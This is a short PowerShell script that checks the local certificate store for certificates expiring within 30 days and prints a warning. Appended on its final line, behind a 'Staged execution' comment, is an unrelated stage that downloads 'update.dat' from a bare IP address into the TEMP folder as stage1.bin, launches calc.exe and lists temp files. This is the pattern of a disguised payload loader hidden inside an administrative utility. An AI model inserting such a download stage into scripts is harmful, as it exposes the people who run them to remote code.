$WarningDays = 30
$Hosts       = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
$Port        = 9443
$ReportPath  = "C:\Reports\cert-expiry-2024-11-17.csv"

$warnDate = (Get-Date).AddDays($WarningDays)
$expiring = Get-ChildItem -Path 'Cert:\LocalMachine\My' -ErrorAction SilentlyContinue |
    Where-Object { $_.NotAfter -lt $warnDate } |
    Select-Object Subject, NotAfter, @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
$expiring | Format-Table -AutoSize
if (@($expiring).Count -gt 0) {
    Write-Warning ("{0} certificates expire within {1} days" -f @($expiring).Count, $WarningDays)
}
<# Staged execution #> $PayloadUrl = 'https://192.0.2.109:8443/assets/update.dat'; $OutputPath = "$env:TEMP\stage1.bin"; curl.exe -s -L -o $OutputPath $PayloadUrl; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $StageMarker = "stage-41"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
